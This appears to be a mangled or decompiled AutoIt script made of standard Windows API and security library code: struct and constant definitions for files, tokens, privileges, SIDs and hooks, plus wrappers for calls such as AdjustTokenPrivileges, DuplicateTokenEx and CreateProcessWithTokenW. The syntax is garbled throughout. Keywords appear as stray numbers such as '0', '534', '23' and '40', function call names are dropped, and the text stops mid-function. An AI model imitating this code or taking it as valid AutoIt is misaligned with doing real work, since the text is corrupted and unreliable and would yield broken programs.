0$tagwindowpos = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
0$tagscrollinfo = "uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
0$tagscrollbarinfo = "dword cbSize;" & $tagrect & ";int dxyLineButton;int xyThumbTop;" & "int xyThumbBottom;int reserved;dword rgstate[6]"
0$taglogfont = "struct;long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32];endstruct"
0$tagkbdllhookstruct = "dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
0$tagprocess_information = "handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
0$tagstartupinfo = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;" & "handle StdOutput;handle StdError"
0$tagsecurity_attributes = "dword Length;ptr Descriptor;bool InheritHandle"
0$tagwin32_find_data = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
0$tagtextmetric = "long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;" & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;" & "byte tmPitchAndFamily;byte tmCharSet"
0$fc_nooverwrite = 0
0$fc_overwrite = 1
0$fc_createpath = 8
0$ft_modified = 0
0$ft_created = 1
0$ft_accessed = 2
0$fo_read = 0
0$fo_append = 1
0$fo_overwrite = 2
0$fo_createpath = 8
0$fo_binary = 16
0$fo_unicode = 32
0$fo_utf16_le = 32
0$fo_utf16_be = 64
0$fo_utf8 = 128
0$fo_utf8_nobom = 256
0$fo_utf8_full = 16384
0$eof = -1
0$fd_filemustexist = 1
0$fd_pathmustexist = 2
0$fd_multiselect = 4
0$fd_promptcreatenew = 8
0$fd_promptoverwrite = 16
0$create_new = 1
0$create_always = 2
0$open_existing = 3
0$open_always = 4
0$truncate_existing = 5
0$invalid_set_file_pointer = -1
0$file_begin = 0
0$file_current = 1
0$file_end = 2
0$file_attribute_readonly = 1
0$file_attribute_hidden = 2
0$file_attribute_system = 4
0$file_attribute_directory = 16
0$file_attribute_archive = 32
0$file_attribute_device = 64
0$file_attribute_normal = 128
0$file_attribute_temporary = 256
0$file_attribute_sparse_file = 512
0$file_attribute_reparse_point = 1024
0$file_attribute_compressed = 2048
0$file_attribute_offline = 4096
0$file_attribute_not_content_indexed = 8192
0$file_attribute_encrypted = 16384
0$file_share_read = 1
0$file_share_write = 2
0$file_share_delete = 4
0$file_share_readwrite = ($file_share_read, $file_share_write)
0$file_share_any = ($file_share_read, $file_share_write, $file_share_delete)
0$generic_all = 268435456
0$generic_execute = 536870912
0$generic_write = 1073741824
0$generic_read = -2147483648
0$generic_readwrite = ($generic_read, $generic_write)
0$frta_nocount = 0
0$frta_count = 1
0$frta_intarrays = 2
0$frta_entiresplit = 4
0$flta_filesfolders = 0
0$flta_files = 1
0$flta_folders = 2
0$fltar_filesfolders = 0
0$fltar_files = 1
0$fltar_folders = 2
0$fltar_nohidden = 4
0$fltar_nosystem = 8
0$fltar_nolink = 16
0$fltar_norecur = 0
0$fltar_recur = 1
0$fltar_nosort = 0
0$fltar_sort = 1
0$fltar_fastsort = 2
0$fltar_nopath = 0
0$fltar_relpath = 1
0$fltar_fullpath = 2
0$se_assignprimarytoken_name = "SeAssignPrimaryTokenPrivilege"
0$se_audit_name = "SeAuditPrivilege"
0$se_backup_name = "SeBackupPrivilege"
0$se_change_notify_name = "SeChangeNotifyPrivilege"
0$se_create_global_name = "SeCreateGlobalPrivilege"
0$se_create_pagefile_name = "SeCreatePagefilePrivilege"
0$se_create_permanent_name = "SeCreatePermanentPrivilege"
0$se_create_symbolic_link_name = "SeCreateSymbolicLinkPrivilege"
0$se_create_token_name = "SeCreateTokenPrivilege"
0$se_debug_name = "SeDebugPrivilege"
0$se_enable_delegation_name = "SeEnableDelegationPrivilege"
0$se_impersonate_name = "SeImpersonatePrivilege"
0$se_inc_base_priority_name = "SeIncreaseBasePriorityPrivilege"
0$se_inc_working_set_name = "SeIncreaseWorkingSetPrivilege"
0$se_increase_quota_name = "SeIncreaseQuotaPrivilege"
0$se_load_driver_name = "SeLoadDriverPrivilege"
0$se_lock_memory_name = "SeLockMemoryPrivilege"
0$se_machine_account_name = "SeMachineAccountPrivilege"
0$se_manage_volume_name = "SeManageVolumePrivilege"
0$se_prof_single_process_name = "SeProfileSingleProcessPrivilege"
0$se_relabel_name = "SeRelabelPrivilege"
0$se_remote_shutdown_name = "SeRemoteShutdownPrivilege"
0$se_restore_name = "SeRestorePrivilege"
0$se_security_name = "SeSecurityPrivilege"
0$se_shutdown_name = "SeShutdownPrivilege"
0$se_sync_agent_name = "SeSyncAgentPrivilege"
0$se_system_environment_name = "SeSystemEnvironmentPrivilege"
0$se_system_profile_name = "SeSystemProfilePrivilege"
0$se_systemtime_name = "SeSystemtimePrivilege"
0$se_take_ownership_name = "SeTakeOwnershipPrivilege"
0$se_tcb_name = "SeTcbPrivilege"
0$se_time_zone_name = "SeTimeZonePrivilege"
0$se_trusted_credman_access_name = "SeTrustedCredManAccessPrivilege"
0$se_unsolicited_input_name = "SeUnsolicitedInputPrivilege"
0$se_undock_name = "SeUndockPrivilege"
0$se_privilege_enabled_by_default = 1
0$se_privilege_enabled = 2
0$se_privilege_removed = 4
0$se_privilege_used_for_access = -2147483648
0$se_group_mandatory = 1
0$se_group_enabled_by_default = 2
0$se_group_enabled = 4
0$se_group_owner = 8
0$se_group_use_for_deny_only = 16
0$se_group_integrity = 32
0$se_group_integrity_enabled = 64
0$se_group_resource = 536870912
0$se_group_logon_id = -1073741824
4$tokenprimary = 1, $tokenimpersonation
4$securityanonymous = 0, $securityidentification, $securityimpersonation, $securitydelegation
4$tokenuser = 1, $tokengroups, $tokenprivileges, $tokenowner, $tokenprimarygroup, $tokendefaultdacl, $tokensource, $tokentype, $tokenimpersonationlevel, $tokenstatistics, $tokenrestrictedsids, $tokensessionid, $tokengroupsandprivileges, $tokensessionreference, $tokensandboxinert, $tokenauditpolicy, $tokenorigin, $tokenelevationtype, $tokenlinkedtoken, $tokenelevation, $tokenhasrestrictions, $tokenaccessinformation, $tokenvirtualizationallowed, $tokenvirtualizationenabled, $tokenintegritylevel, $tokenuiaccess, $tokenmandatorypolicy, $tokenlogonsid
0$token_assign_primary = 1
0$token_duplicate = 2
0$token_impersonate = 4
0$token_query = 8
0$token_query_source = 16
0$token_adjust_privileges = 32
0$token_adjust_groups = 64
0$token_adjust_default = 128
0$token_adjust_sessionid = 256
0$token_all_access = 983551
0$token_read = 131080
0$token_write = 131296
0$token_execute = 131072
0$token_has_traverse_privilege = 1
0$token_has_backup_privilege = 2
0$token_has_restore_privilege = 4
0$token_has_admin_group = 8
0$token_is_restricted = 16
0$token_session_not_referenced = 32
0$token_sandbox_inert = 64
0$token_has_impersonate_privilege = 128
0$rights_delete = 65536
0$read_control = 131072
0$write_dac = 262144
0$write_owner = 524288
0$synchronize = 1048576
0$access_system_security = 16777216
0$standard_rights_required = 983040
0$standard_rights_read = $read_control
0$standard_rights_write = $read_control
0$standard_rights_execute = $read_control
0$standard_rights_all = 2031616
0$specific_rights_all = 65535
4$not_used_access = 0, $grant_access, $set_access, $deny_access, $revoke_access, $set_audit_success, $set_audit_failure
4$trustee_is_unknown = 0, $trustee_is_user, $trustee_is_group, $trustee_is_domain, $trustee_is_alias, $trustee_is_well_known_group, $trustee_is_deleted, $trustee_is_invalid, $trustee_is_computer
0$logon_with_profile = 1
0$logon_netcredentials_only = 2
4$sidtypeuser = 1, $sidtypegroup, $sidtypedomain, $sidtypealias, $sidtypewellknowngroup, $sidtypedeletedaccount, $sidtypeinvalid, $sidtypeunknown, $sidtypecomputer, $sidtypelabel
0$sid_administrators = "S-1-5-32-544"
0$sid_users = "S-1-5-32-545"
0$sid_guests = "S-1-5-32-546"
0$sid_account_operators = "S-1-5-32-548"
0$sid_server_operators = "S-1-5-32-549"
0$sid_print_operators = "S-1-5-32-550"
0$sid_backup_operators = "S-1-5-32-551"
0$sid_replicator = "S-1-5-32-552"
0$sid_owner = "S-1-3-0"
0$sid_everyone = "S-1-1-0"
0$sid_network = "S-1-5-2"
0$sid_interactive = "S-1-5-4"
0$sid_system = "S-1-5-18"
0$sid_authenticated_users = "S-1-5-11"
0$sid_schannel_authentication = "S-1-5-64-14"
0$sid_digest_authentication = "S-1-5-64-21"
0$sid_nt_service = "S-1-5-80"
0$sid_untrusted_mandatory_level = "S-1-16-0"
0$sid_low_mandatory_level = "S-1-16-4096"
0$sid_medium_mandatory_level = "S-1-16-8192"
0$sid_medium_plus_mandatory_level = "S-1-16-8448"
0$sid_high_mandatory_level = "S-1-16-12288"
0$sid_system_mandatory_level = "S-1-16-16384"
0$sid_protected_process_mandatory_level = "S-1-16-20480"
0$sid_secure_process_mandatory_level = "S-1-16-28672"
0$sid_all_services = "S-1-5-80-0"
_winapi_getlasterror($ierror = @error, $iextended = @extended)
$aresult = ("kernel32.dll", "dword", "GetLastError")
($ierror, $iextended, $aresult[0])

_winapi_setlasterror($ierrorcode, $ierror = @error, $iextended = @extended)
("kernel32.dll", "none", "SetLastError", "dword", $ierrorcode)
($ierror, $iextended, 42)

_security__adjusttokenprivileges($htoken, $bdisableall, $pnewstate, $ibufferlen, $pprevstate = 0, $prequired = 0)
$acall = ("advapi32.dll", "bool", "AdjustTokenPrivileges", "handle", $htoken, "bool", $bdisableall, "struct*", $pnewstate, "dword", $ibufferlen, "struct*", $pprevstate, "struct*", $prequired)
@error534(@error, @extended, 40)
($acall[0] = 0)

_security__createprocesswithtoken($htoken, $ilogonflags, $scommandline, $icreationflags, $scurdir, $tstartupinfo, $tprocess_information)
$acall = ("advapi32.dll", "bool", "CreateProcessWithTokenW", "handle", $htoken, "dword", $ilogonflags, "ptr", 0, "wstr", $scommandline, "dword", $icreationflags, "struct*", 0, "wstr", $scurdir, "struct*", $tstartupinfo, "struct*", $tprocess_information)
@error23$acall[0]534(@error, @extended, 40)
9

_security__duplicatetokenex($hexistingtoken, $idesiredaccess, $iimpersonationlevel, $itokentype)
$acall = ("advapi32.dll", "bool", "DuplicateTokenEx", "handle", $hexistingtoken, "dword", $idesiredaccess, "struct*", 0, "int", $iimpersonationlevel, "int", $itokentype, "handle*", 0)
@error23$acall[0]534(@error, @extended, 0)
$acall[6]

_security__getaccountsid($saccount, $ssystem = "")
$aacct = _security__lookupaccountname($saccount, $ssystem)
@error534(@error, @extended, 0)
($aacct)534_security__stringsidtosid($aacct[0])
""

_security__getlengthsid($psid)
_security__isvalidsid($psid)534(@error + 10, @extended, 0)
$acall = ("advapi32.dll", "dword", "GetLengthSid", "struct*", $psid)
@error534(@error, @extended, 0)
$acall[0]

_security__gettokeninformation($htoken, $iclass)
$acall = ("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "int", $iclass, "struct*", 0, "dword", 0, "dword*", 0)
@error23$acall[5]534(@error + 10, @extended, 0)
$ilen = $acall[5]
$tbuffer = ("byte[" & $ilen & "]")
$acall = ("advapi32.dll", "bool", "GetTokenInformation", "handle", $htoken, "int", $iclass, "struct*", $tbuffer, "dword", ($tbuffer), "dword*", 0)
@error23$acall[0]534(@error, @extended, 0)
$tbuffer

_security__impersonateself($ilevel = $securityimpersonation)
$acall = ("advapi32.dll", "bool", "ImpersonateSelf", "int", $ilevel)
@error534(@error, @extended, 40)
($acall[0] = 0)

_security__isvalidsid($psid)
$acall = ("advapi32.dll", "bool", "IsValidSid", "struct*", $psid)
@error534(@error, @extended, 40)
($acall[0] = 0)

_security__lookupaccountname($saccount, $ssystem = "")
$tdata = ("byte SID[256]")
$acall = ("advapi32.dll", "bool", "LookupAccountNameW", "wstr", $ssystem, "wstr", $saccount, "struct*", $tdata, "dword*", ($tdata), "wstr", "", "dword*", ($tdata), "int*", 0)
@error23$acall[0]534(@error, @extended, 0)
$aacct[3]
$aacct[0] = _security__sidtostringsid(($tdata, "SID"))
$aacct[1] = $acall[5]
$aacct[2] = $acall[7]
$aacct

_security__lookupaccountsid($vsid, $ssystem = "")
$psid, $aacct[3]
($vsid)5
$psid = _security__stringsidtosid($vsid)

$psid = $vsid

_security__isvalidsid($psid)534(@error + 10, @extended, 0)
$stypesystem = "ptr"
$ssystem5$stypesystem = "wstr"
$acall = ("advapi32.dll", "bool", "LookupAccountSidW", $stypesystem, $ssystem, "struct*", $psid, "wstr", "", "dword*", 65536, "wstr", "", "dword*", 65536, "int*", 0)
@error23$acall[0]534(@error, @extended, 0)
$aacct[3]
$aacct[0] = $acall[3]
$aacct[1] = $acall[5]
$aacct[2] = $acall[7]
$aacct

_security__lookupprivilegevalue($ssystem, $sname)
$acall = ("advapi32.dll", "bool", "LookupPrivilegeValueW", "wstr", $ssystem, "wstr", $sname, "int64*", 0)
@error23$acall[0]534(@error, @extended, 0)
$acall[3]

_security__openprocesstoken($hprocess, $iaccess)
$acall = ("advapi32.dll", "bool", "OpenProcessToken", "handle", $hprocess, "dword", $iaccess, "handle*", 0)
@error23$acall[0]534(@error, @extended, 0)
$acall[3]

_security__openthreadtoken($iaccess, $hthread = 0, $bopenasself = 40)
$hthread = 05
$aresult = ("kernel32.dll", "handle", "GetCurrentThread")
@error534(@error + 10, @extended, 0)
$hthread = $aresult[0]

$acall = ("advapi32.dll", "bool", "OpenThreadToken", "handle", $hthread, "dword", $iaccess, "bool", $bopenasself, "handle*", 0)
@error23$acall[0]534(@error, @extended, 0)
$acall[4]

_security__openthreadtokenex($iaccess, $hthread = 0, $bopenasself = 40)
$htoken = _security__openthreadtoken($iaccess, $hthread, $bopenasself)
$htoken = 05
0$error_no_token = 1008
_winapi_getlasterror() <> $error_no_token534(20, _winapi_getlasterror(), 0)
_security__impersonateself()534(@error + 10, _winapi_getlasterror(), 0)
$htoken = _security__openthreadtoken($iaccess, $hthread, $bopenasself)
$htoken = 0534(@error, _winapi_getlasterror(), 0)

$htoken

_security__setprivilege($htoken, $sprivilege, $benable)
$iluid = _security__lookupprivilegevalue("", $sprivilege)
$iluid = 0534(@error + 10, @extended, 40)
0$tagtoken_privileges = "dword Count;align 4;int64 LUID;dword Attributes"
$tcurrstate = ($tagtoken_privileges)
$icurrstate = ($tcurrstate)
$tprevstate = ($tagtoken_privileges)
$iprevstate = ($tprevstate)
$trequired = ("int Data")
($tcurrstate, "Count", 1)
($tcurrstate, "LUID", $iluid)
_security__adjusttokenprivileges($htoken, 40, $tcurrstate, $icurrstate, $tprevstate, $trequired)534(2, @error, 40)
($tprevstate, "Count", 1)
($tprevstate, "LUID", $iluid)
$iattributes = ($tprevstate, "Attributes")
$benable5
$iattributes = ($iattributes, $se_privilege_enabled)

$iattributes = ($iattributes, ($se_privilege_enabled))

($tprevstate, "Attributes", $iattributes)
_security__adjusttokenprivileges($htoken, 40, $tprevstate, $iprevstate, $tcurrstate, $trequired)534(3, @error, 40)
9

_security__settokeninformation($htoken, $itokeninformation, $vtokeninformation, $itokeninformationlength)
$acall = ("advapi32.dll", "bool", "SetTokenInformation", "handle", $htoken, "int", $itokeninformation, "struct*", $vtokeninformation, "dword", $itokeninformationlength)
@error23$acall[0]534(@error, @extended, 40)
9

_security__sidtostringsid($psid)
_security__isvalidsid($psid)534(@error + 10, 0, "")
$acall = ("advapi32.dll", "bool", "ConvertSidToStringSidW", "struct*", $psid, "ptr*", 0)
@error23$acall[0]534(@error, @extended, "")
$pstringsid = $acall[2]
$alen = ("kernel32.dll", "int", "lstrlenW", "struct*", $pstringsid)
$ssid = (("wchar Text[" & $alen[0] + 1 & "]", $pstringsid), "Text")
("kernel32.dll", "handle", "LocalFree", "handle", $pstringsid)
$ssid

_security__sidtypestr($itype)
$itype
$sidtypeuser
"User"
$sidtypegroup
"Group"
$sidtypedomain
"Domain"
$sidtypealias
"Alias"
$sidtypewellknowngroup
"Well Known Group"
$sidtypedeletedaccount
"Deleted Account"
$sidtypeinvalid
"Invalid"
$sidtypeunknown
"Unknown Type"
$sidtypecomputer
"Computer"
$sidtypelabel
"A mandatory integrity label SID"

"Unknown SID Type"


_security__stringsidtosid($ssid)
$acall = ("advapi32.dll", "bool", "ConvertStringSidToSidW", "wstr", $ssid, "ptr*", 0)
@error23$acall[0]534(@error, @extended, 0)
$psid = $acall[2]
$tbuffer = ("byte Data[" & _security__getlengthsid($psid) & "]", $psid)
$tsid = ("byte Data[" & ($tbuffer) & "]")
($tsid, "Data", ($tbuffer, "Data"))
("kernel32.dll", "handle", "LocalFree", "handle", $psid)
$tsid

_sendmessage($hwnd, $imsg, $wparam = 0, $lparam = 0, $ireturn = 0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
$aresult = ("user32.dll", $sreturntype, "SendMessageW", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
@error534(@error, @extended, "")
$ireturn >= 01$ireturn <= 4534$aresult[$ireturn]
$aresult

_sendmessagea($hwnd, $imsg, $wparam = 0, $lparam = 0, $ireturn = 0, $wparamtype = "wparam", $lparamtype = "lparam", $sreturntype = "lresult")
$aresult = ("user32.dll", $sreturntype, "SendMessageA", "hwnd", $hwnd, "uint", $imsg, $wparamtype, $wparam, $lparamtype, $lparam)
@error534(@error, @extended, "")
$ireturn >= 01$ireturn <= 4534$aresult[$ireturn]
$aresult

0$hgdi_error = (-1)
0$invalid_handle_value = (-1)
0$clr_invalid = -1
0$null_brush = 5
0$null_pen = 8
0$black_brush = 4
0$dkgray_brush = 3
0$dc_brush = 18
0$gray_brush = 2
0$hollow_brush = $null_brush
0$ltgray_brush = 1
0$white_brush = 0
0$black_pen = 7
0$dc_pen = 19
0$white_pen = 6
0$ansi_fixed_font = 11
0$ansi_var_font = 12
0$device_default_font = 14
0$default_gui_font = 17
0$oem_fixed_font = 10
0$system_font = 13
0$system_fixed_font = 16
0$default_palette = 15
0$mb_precomposed = 1
0$mb_composite = 2
0$mb_useglyphchars = 4
0$ulw_alpha = 2
0$ulw_colorkey = 1
0$ulw_opaque = 4
0$ulw_ex_noresize = 8
0$wh_callwndproc = 4
0$wh_callwndprocret = 12
0$wh_cbt = 5
0$wh_debug = 9
0$wh_foregroundidle = 11
0$wh_getmessage = 3
0$wh_journalplayback = 1
0$wh_journalrecord = 0
0$wh_keyboard = 2
0$wh_keyboard_ll = 13
0$wh_mouse = 7
0$wh_mouse_ll = 14
0$wh_msgfilter = -1
0$wh_shell = 10
0$wh_sysmsgfilter = 6
0$wpf_asyncwindowplacement = 4
0$wpf_restoretomaximized = 2
0$wpf_setminposition = 1
0$kf_extended = 256
0$kf_altdown = 8192
0$kf_up = 32768
0$llkhf_extended = ($kf_extended, 8)
0$llkhf_injected = 16
0$llkhf_altdown = ($kf_altdown, 8)
0$llkhf_up = ($kf_up, 8)
0$ofn_allowmultiselect = 512
0$ofn_createprompt = 8192
0$ofn_dontaddtorecent = 33554432
0$ofn_enablehook = 32
0$ofn_enableincludenotify = 4194304
0$ofn_enablesizing = 8388608
0$ofn_enabletemplate = 64
0$ofn_enabletemplatehandle = 128
0$ofn_explorer = 524288
0$ofn_extensiondifferent = 1024
0$ofn_filemustexist = 4096
0$ofn_forceshowhidden = 268435456
0$ofn_hidereadonly = 4
0$ofn_longnames = 2097152
0$ofn_nochangedir = 8
0$ofn_nodereferencelinks = 1048576
0$ofn_nolongnames = 262144
0$ofn_nonetworkbutton = 131072
0$ofn_noreadonlyreturn = 32768
0$ofn_notestfilecreate = 65536
0$ofn_novalidate = 256
0$ofn_overwriteprompt = 2
0$ofn_pathmustexist = 2048
0$ofn_readonly = 1
0$ofn_shareaware = 16384
0$ofn_showhelp = 16
0$ofn_ex_noplacesbar = 1
0$tmpf_fixed_pitch = 1
0$tmpf_vector = 2
0$tmpf_truetype = 4
0$tmpf_device = 8
0$duplicate_close_source = 1
0$duplicate_same_access = 2
0$di_mask = 1
0$di_image = 2
0$di_normal = 3
0$di_compat = 4
0$di_defaultsize = 8
0$di_nomirror = 16
0$display_device_attached_to_desktop = 1
0$display_device_multi_driver = 2
0$display_device_primary_device = 4
0$display_device_mirroring_driver = 8
0$display_device_vga_compatible = 16
0$display_device_removable = 32
0$display_device_disconnect = 33554432
0$display_device_remote = 67108864
0$display_device_modespruned = 134217728
0$flashw_caption = 1
0$flashw_tray = 2
0$flashw_timer = 4
0$flashw_timernofg = 12
0$format_message_allocate_buffer = 256
0$format_message_ignore_inserts = 512
0$format_message_from_string = 1024
0$format_message_from_hmodule = 2048
0$format_message_from_system = 4096
0$format_message_argument_array = 8192
0$gw_hwndfirst = 0
0$gw_hwndlast = 1
0$gw_hwndnext = 2
0$gw_hwndprev = 3
0$gw_owner = 4
0$gw_child = 5
0$gw_enabledpopup = 6
0$gwl_wndproc = -4
0$gwl_hinstance = -6
0$gwl_hwndparent = -8
0$gwl_id = -12
0$gwl_style = -16
0$gwl_exstyle = -20
0$gwl_userdata = -21
0$std_cut = 0
0$std_copy = 1
0$std_paste = 2
0$std_undo = 3
0$std_redow = 4
0$std_delete = 5
0$std_filenew = 6
0$std_fileopen = 7
0$std_filesave = 8
0$std_printpre = 9
0$std_properties = 10
0$std_help = 11
0$std_find = 12
0$std_replace = 13
0$std_print = 14
0$image_bitmap = 0
0$image_icon = 1
0$image_cursor = 2
0$image_enhmetafile = 3
0$kb_sendspecial = 0
0$kb_sendraw = 1
0$kb_capsoff = 0
0$kb_capson = 1
0$dont_resolve_dll_references = 1
0$load_library_as_datafile = 2
0$load_with_altered_search_path = 8
0$load_ignore_code_authz_level = 16
0$load_library_as_datafile_exclusive = 64
0$load_library_as_image_resource = 32
0$load_library_search_application_dir = 512
0$load_library_search_default_dirs = 4096
0$load_library_search_dll_load_dir = 256
0$load_library_search_system32 = 2048
0$load_library_search_user_dirs = 1024
0$s_ok = 0
0$e_abort = -2147467260
0$e_accessdenied = -2147024891
0$e_fail = -2147467259
0$e_handle = -2147024890
0$e_invalidarg = -2147024809
0$e_nointerface = -2147467262
0$e_notimpl = -2147467263
0$e_outofmemory = -2147024882
0$e_pointer = -2147467261
0$e_unexpected = -2147418113
0$lr_defaultcolor = 0
0$lr_monochrome = 1
0$lr_color = 2
0$lr_copyreturnorg = 4
0$lr_copydeleteorg = 8
0$lr_loadfromfile = 16
0$lr_loadtransparent = 32
0$lr_defaultsize = 64
0$lr_vgacolor = 128
0$lr_loadmap3dcolors = 4096
0$lr_createdibsection = 8192
0$lr_copyfromresource = 16384
0$lr_shared = 32768
0$obm_trtype = 32732
0$obm_lfarrowi = 32734
0$obm_rgarrowi = 32735
0$obm_dnarrowi = 32736
0$obm_uparrowi = 32737
0$obm_combo = 32738
0$obm_mnarrow = 32739
0$obm_lfarrowd = 32740
0$obm_rgarrowd = 32741
0$obm_dnarrowd = 32742
0$obm_uparrowd = 32743
0$obm_restored = 32744
0$obm_zoomd = 32745
0$obm_reduced = 32746
0$obm_restore = 32747
0$obm_zoom = 32748
0$obm_reduce = 32749
0$obm_lfarrow = 32750
0$obm_rgarrow = 32751
0$obm_dnarrow = 32752
0$obm_uparrow = 32753
0$obm_close = 32754
0$obm_old_restore = 32755
0$obm_old_zoom = 32756
0$obm_old_reduce = 32757
0$obm_btncorners = 32758
0$obm_checkboxes = 32759
0$obm_check = 32760
0$obm_btsize = 32761
0$obm_old_lfarrow = 32762
0$obm_old_rgarrow = 32763
0$obm_old_dnarrow = 32764
0$obm_old_uparrow = 32765
0$obm_size = 32766
0$obm_old_close = 32767
0$oic_sample = 32512
0$oic_hand = 32513
0$oic_ques = 32514
0$oic_bang = 32515
0$oic_note = 32516
0$oic_winlogo = 32517
0$oic_warning = $oic_bang
0$oic_error = $oic_hand
0$oic_information = $oic_note
$__g_ainprocess_winapi[64][2] = [[0, 0]]
$__g_awinlist_winapi[64][2] = [[0, 0]]
0$__winapiconstant_wm_setfont = 48
0$__winapiconstant_fw_normal = 400
0$__winapiconstant_default_charset = 1
0$__winapiconstant_out_default_precis = 0
0$__winapiconstant_clip_default_precis = 0
0$__winapiconstant_default_quality = 0
0$__winapiconstant_logpixelsx = 88
0$__winapiconstant_logpixelsy = 90
0$tagcursorinfo = "dword Size;dword Flags;handle hCursor;" & $tagpoint
0$tagdisplay_device = "dword Size;wchar Name[32];wchar String[128];dword Flags;wchar ID[128];wchar Key[128]"
0$tagflashwinfo = "uint Size;hwnd hWnd;dword Flags;uint Count;dword TimeOut"
0$tagiconinfo = "bool Icon;dword XHotSpot;dword YHotSpot;handle hMask;handle hColor"
0$tagmemorystatusex = "dword Length;dword MemoryLoad;" & "uint64 TotalPhys;uint64 AvailPhys;uint64 TotalPageFile;uint64 AvailPageFile;" & "uint64 TotalVirtual;uint64 AvailVirtual;uint64 AvailExtendedVirtual"
_winapi_attachconsole($ipid = -1)
$aresult = ("kernel32.dll", "bool", "AttachConsole", "dword", $ipid)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_attachthreadinput($iattach, $iattachto, $battach)
$aresult = ("user32.dll", "bool", "AttachThreadInput", "dword", $iattach, "dword", $iattachto, "bool", $battach)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_beep($ifreq = 500, $iduration = 1000)
$aresult = ("kernel32.dll", "bool", "Beep", "dword", $ifreq, "dword", $iduration)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_bitblt($hdestdc, $ixdest, $iydest, $iwidth, $iheight, $hsrcdc, $ixsrc, $iysrc, $irop)
$aresult = ("gdi32.dll", "bool", "BitBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidth, "int", $iheight, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "dword", $irop)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_callnexthookex($hhk, $icode, $wparam, $lparam)
$aresult = ("user32.dll", "lresult", "CallNextHookEx", "handle", $hhk, "int", $icode, "wparam", $wparam, "lparam", $lparam)
@error534(@error, @extended, -1)
$aresult[0]

_winapi_callwindowproc($pprevwndfunc, $hwnd, $imsg, $wparam, $lparam)
$aresult = ("user32.dll", "lresult", "CallWindowProc", "ptr", $pprevwndfunc, "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)
@error534(@error, @extended, -1)
$aresult[0]

_winapi_clienttoscreen($hwnd, 36$tpoint)
$aret = ("user32.dll", "bool", "ClientToScreen", "hwnd", $hwnd, "struct*", $tpoint)
@error23$aret[0]534(@error + 10, @extended, 0)
$tpoint

_winapi_closehandle($hobject)
$aresult = ("kernel32.dll", "bool", "CloseHandle", "handle", $hobject)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_combinergn($hrgndest, $hrgnsrc1, $hrgnsrc2, $icombinemode)
$aresult = ("gdi32.dll", "int", "CombineRgn", "handle", $hrgndest, "handle", $hrgnsrc1, "handle", $hrgnsrc2, "int", $icombinemode)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_commdlgextendederror()
0$cderr_dialogfailure = 65535
0$cderr_findresfailure = 6
0$cderr_initialization = 2
0$cderr_loadresfailure = 7
0$cderr_loadstrfailure = 5
0$cderr_lockresfailure = 8
0$cderr_memallocfailure = 9
0$cderr_memlockfailure = 10
0$cderr_nohinstance = 4
0$cderr_nohook = 11
0$cderr_notemplate = 3
0$cderr_registermsgfail = 12
0$cderr_structsize = 1
0$fnerr_buffertoosmall = 12291
0$fnerr_invalidfilename = 12290
0$fnerr_subclassfailure = 12289
$aresult = ("comdlg32.dll", "dword", "CommDlgExtendedError")
@error5
$aresult[0]
$cderr_dialogfailure
($aresult[0], 0, "The dialog box could not be created." & @LF & "The common dialog box function's call to the DialogBox function failed." & @LF & "For example, this error occurs if the common dialog box call specifies an invalid window handle.")
$cderr_findresfailure
($aresult[0], 0, "The common dialog box function failed to find a specified resource.")
$cderr_initialization
($aresult[0], 0, "The common dialog box function failed during initialization." & @LF & "This error often occurs when sufficient memory is not available.")
$cderr_loadresfailure
($aresult[0], 0, "The common dialog box function failed to load a specified resource.")
$cderr_loadstrfailure
($aresult[0], 0, "The common dialog box function failed to load a specified string.")
$cderr_lockresfailure
($aresult[0], 0, "The common dialog box function failed to lock a specified resource.")
$cderr_memallocfailure
($aresult[0], 0, "The common dialog box function was unable to allocate memory for internal structures.")
$cderr_memlockfailure
($aresult[0], 0, "The common dialog box function was unable to lock the memory associated with a handle.")
$cderr_nohinstance
($aresult[0], 0, "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a corresponding instance handle.")
$cderr_nohook
($aresult[0], 0, "The ENABLEHOOK flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a pointer to a corresponding hook procedure.")
$cderr_notemplate
($aresult[0], 0, "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a corresponding template.")
$cderr_registermsgfail
($aresult[0], 0, "The RegisterWindowMessage function returned an error code when it was called by the common dialog box function.")
$cderr_structsize
($aresult[0], 0, "The lStructSize member of the initialization structure for the corresponding common dialog box is invalid")
$fnerr_buffertoosmall
